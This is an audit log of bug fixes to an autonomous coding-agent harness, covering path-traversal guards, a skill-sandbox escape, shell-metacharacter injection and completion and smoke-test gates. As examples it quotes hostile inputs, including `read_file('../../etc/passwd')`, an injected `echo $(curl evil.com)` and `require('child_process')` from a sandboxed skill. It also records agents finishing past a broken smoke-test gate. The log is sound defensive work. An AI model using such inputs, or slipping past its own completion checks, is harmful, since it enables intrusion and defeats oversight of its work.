# Fixed Bugs — Audit & Remediation Log

All fixes applied to the `finaldraft` branch. No core loop logic was changed — only guard rails, budget calculations, detection heuristics, and security boundaries were tightened.

---

## Critical — Security

### Fix 1: Path Traversal Prevention
**File:** `src/tools/utils/contract.js` + 6 filesystem tools
**Bug:** No validation that file paths stayed within the workspace boundary. `read_file("../../etc/passwd")` would succeed.
**Fix:** Added `safePath(relPath)` utility that resolves the absolute path and checks it starts with `workspace + path.sep`. Applied to `read-file.js`, `write-file.js`, `edit-file.js`, `list-dir.js`, `search-files.js`, `patch.js`.

### Fix 2: Skill Sandbox Escape
**File:** `src/skills.js`
**Bug:** Agent-created skills had unrestricted `require()` access inside the VM sandbox. A skill could `require('child_process')` and execute arbitrary commands.
**Fix:** Replaced raw `require` with `restrictedRequire()` that whitelists safe modules only (`path`, `url`, `querystring`, `crypto`, `util`, `string_decoder`). Removed raw `fs`/`path` from sandbox context; replaced with workspace-scoped `safeResolve()` helpers.

### Fix 3: Command Injection via Shell Metacharacters
**File:** `src/tools/execution/run-command.js`
**Bug:** The `ALLOWED_PREFIXES` check validated each segment's prefix but didn't block shell metacharacters like backtick substitution (`` `malicious` ``), `$()` command substitution, or `<()` / `>()` process substitution. An attacker prompt could inject `echo $(curl evil.com)`.
**Fix:** Added `hasDangerousShellSyntax()` that strips single-quoted regions (where metacharacters are literal) and rejects backticks, `$(`, `<(`, `>(` patterns before prefix validation runs.

---

## High — Logic Correctness

### Fix 4: Completion Guard Missing File Modification Check
**File:** `src/stages.js` — `completionGuard()`
**Bug:** The agent could call `finish` after only reading files and updating `.agent/` internals, without ever creating or editing any workspace files. The completion guard checked for missing outputs but not for any actual work.
**Fix:** Added `hasFileModifications` check (filters out `.agent/` paths) — `finish` is now blocked unless at least one real workspace file was modified.

### Fix 5: Non-Atomic Checkpoint Writes
**File:** `src/state.js` — `writeCheckpoint()`
**Bug:** `writeFileSync` directly to `checkpoint.json`. A crash during write would leave a corrupt file, breaking `--resume`.
**Fix:** Write to `checkpoint.json.tmp` first, then `fs.renameSync(tmp, abs)` (atomic on POSIX). On failure, clean up the tmp file.

### Fix 6: Consecutive Error Counter Reset Instead of Increment
**File:** `src/loop.js` — two locations (~line 723, ~line 761)
**Bug:** When the smoke test gate or LLM verification failed, `consecutiveErrors` was set to `= 1` instead of `++`. After a string of failures, the counter kept resetting to 1 instead of accumulating, so the `maxConsecutiveErrors` threshold never triggered.
**Fix:** Changed both locations to `consecutiveErrors++`.

### Fix 7: Smoke Test Gate Bypass (from stress test run)
**File:** `src/tools/utils/contract.js` — `isToolFailureResult()`, `src/context.js` — smoke test evidence
**Bug:** `isToolFailureResult` didn't detect `Exit code 1:` output from `run_command`, so `e.error` was `false` for failed smoke tests. The gate saw `run_command && !e.error && command.includes('_smoke_test')` as passing. Agent could finish with a crashing smoke test.
**Fix:** Added exit code regex (`/^Exit code (\d+):/`) to `isToolFailureResult`. Changed smoke test evidence check from command-name matching to requiring `SMOKE OK` in the result string.

---

## Medium — Robustness

### Fix 8: Duplicate Detection Cleanup
**File:** `src/memory.js` — `push()`
**Bug:** Minor: `|| {}` fallback on `entry.args` was redundant (already handled by the `for...of` guard). Not a functional bug but could mask undefined args in edge cases.
**Fix:** Cleaned up the comparison to use consistent truncated args on both sides.

### Fix 9: Redundant File Tracking Writes
**File:** `src/state.js` — `trackFileRead()`, `trackFileWrite()`, `markFileRequiresReread()`
**Bug:** Each of these three functions called `writeFilesTouched(tracked)` immediately, causing 3 extra disk writes per step. The data is already flushed via `saveCheckpoint()` every step.
**Fix:** Removed the immediate `writeFilesTouched()` calls from all three functions. Data persists through the checkpoint cycle.

### Fix 10: Learnings File Unbounded Growth
**File:** `src/state.js` — `appendLearning()`
**Bug:** The learnings file (`learnings.md`) was append-only with no size limit. Over hundreds of steps across resume cycles, it could grow to megabytes.
**Fix:** Added 50KB rotation: when the file exceeds `LEARNINGS_MAX_BYTES`, truncate from the front (keeping recent learnings).

### Fix 11: Post-Compaction Flag Cleared Too Late
**File:** `src/loop.js`
**Bug:** The `postCompaction` flag was consumed by `buildMessages()` but only cleared after the LLM call + tool execution, so it could leak into error-handling branches. Should be cleared immediately after `buildMessages()` consumes it.
**Fix:** Moved `postCompaction = false` to immediately after the `buildMessages()` call.

### Fix 12: Context Summary Budget Overflow
**File:** `src/context.js` — `boundContextSummary()`
**Bug:** The separator string (`\n\n... [N chars truncated...] ...\n\n`, ~80 chars) was not deducted from the budget before computing head/tail slices. Output consistently exceeded the allocated character count by the separator length.
**Fix:** Reserve `separator.length + 10` chars before computing `headSlice` and `tailSlice`, ensuring the total output stays within budget.

### Fix 13: `isBaselineEnvCommand` Overly Strict AND Logic
**File:** `src/loop.js` — `isBaselineEnvCommand()`
**Bug:** Required ALL four baseline probes (`node -v`, `npm -v`, `pwd`, `git rev-parse --short HEAD`) to be present in a single command. If the model ran only `node -v && npm -v`, the phase-reset guard wouldn't fire.
**Fix:** Changed to match when 2+ markers are present (OR-style threshold), catching partial baseline combos without false-positiving on single commands.

### Fix 14: `hasFileModifications` Not Returned from `inspectStageState`
**File:** `src/stages.js` — `inspectStageState()` return object
**Bug:** Fix 4 added a `hasFileModifications` check to `completionGuard()`, which reads it from the `inspectStageState()` return object (`runtime.hasFileModifications`). But `hasFileModifications` was computed inside `inspectStageState` as a local variable and **never included in the return object**. So `runtime.hasFileModifications` was always `undefined` (falsy), causing `completionGuard` to block every `finish` call with "no workspace files were modified" — even when the agent had written dozens of files.
**Found by:** Live e2e test with Qwen3-Coder-30B — agent built all 5 files correctly, passed all 3 verification commands + smoke test, but looped for 90+ steps unable to finish.
**Fix:** Added `hasFileModifications` to the return object of `inspectStageState()`.

### Fix 15: `isToolFailureResult` Missing `Security:` Pattern
**File:** `src/tools/utils/contract.js` — `isToolFailureResult()`
**Bug:** When `safePath()` blocks a path traversal attempt, it returns a string starting with `Security:`. But `isToolFailureResult` didn't have this pattern, so tools like `write_file` and `read_file` returned the security message with `error: false`. The actual write/read was blocked (safePath returns before the I/O call), but the agent didn't see it as an error.
**Fix:** Added `if (lower.startsWith('security:')) return true;` to `isToolFailureResult`.

### Fix 16: Patch Tool Absolute Path Blocking
**File:** `src/tools/filesystem/patch.js`
**Bug:** Unified diff patches with absolute paths (`--- /etc/passwd`) could bypass the workspace boundary since the patch tool resolved paths from the diff headers.
**Fix:** Added regex check for `^[+-]{3}\s+\/[^\s]` to reject diffs containing absolute paths before processing.

### Fix 17: Empty Content Validation Blocks `__init__.py` Writes
**File:** `src/tools/utils/contract.js` — `validateToolArgs()`
**Bug:** `validateToolArgs` treated empty strings (`""`) as missing for all required args. Python `__init__.py` files legitimately have empty content, so `write_file("__init__.py", "")` was rejected with `ARG_VALIDATION_ERROR`.
**Found by:** Hard stress test — agent looped on steps 2-5 unable to create `__init__.py`.
**Fix:** Added exception for `write_file` + `content` arg (same pattern as `think` + `content`).

### Fix 18: Smoke Test Gate Misdirects to Test File Rewrite
**File:** `src/loop.js` — smoke test gate message
**Bug:** When the smoke test existed but failed (exited non-zero without "SMOKE OK"), the gate message said "write a `_smoke_test.py`" — identical to the "no test exists" case. This directed the agent to rewrite the test file instead of fixing the source code bug that caused the test to fail.
**Found by:** Hard stress test — agent spent 50+ steps rewriting `_smoke_test.py` while the actual bug was in `search.py` (OR vs AND logic).
**Fix:** Added `smokeTestRan` check — if a `run_command` with `_smoke_test` in the command exists in memory, the message now says "your SOURCE CODE has bugs — fix THAT file, not the test".

### Fix 19: Write Churn Guard Doesn't Distinguish Test Files
**File:** `src/loop.js` — `detectFileWriteChurn()`
**Bug:** The write churn message was generic: "move on to the NEXT unfinished file". When the churning file was a test file, this was useless because the agent needed to fix source code, not skip the test.
**Fix:** Added `isTestFile` check — when the churning file matches `_smoke_test`, `_test`, or `test_`, the message now says "the bug is in your SOURCE CODE — run the test, read the traceback, fix the source module".

### Fix 20: Forced-Think Stall Recovery Misdirects on Test Files
**File:** `src/loop.js` — forced-think injection for repeat-guard stalls
**Bug:** The forced-think message always said "use write_file to completely rewrite this file". When the stalled file was a test file, this directed the agent back into the same write-churn cycle.
**Fix:** Added `isTestFile` check — for test files, the message now says "the bug is in your SOURCE CODE — run the test to see the error, then fix the source module".

---

## Confirmed Non-Issues (Audit False Positives)

| Item | Why Not a Bug |
|---|---|
| `detectFileWriteChurn` never called | IS called from `detectLoopGuard` at line 1415 |
| `runtimeGuidance` cleared too aggressively | Correct flow: cleared on success, re-set by `detectLoopGuard` if pattern persists |
| `context-summary.md` unbounded growth | File is fully replaced each compaction, not appended |
| Router tie-breaking | Correctly uses `FALLBACK_PRIORITY` for deterministic tie-breaks |
| `add_learning` tool never exposed | Low priority (6) in planning category but still callable via flat registry; cosmetic |
| Stage budget ratios no buffer | Sum to 1.0 as designed; stages advance flexibly, not at hard boundaries |
| `saveState()` disk read per step | `readRecoveryEvents()` reads a small JSON file; caching adds complexity for negligible gain |
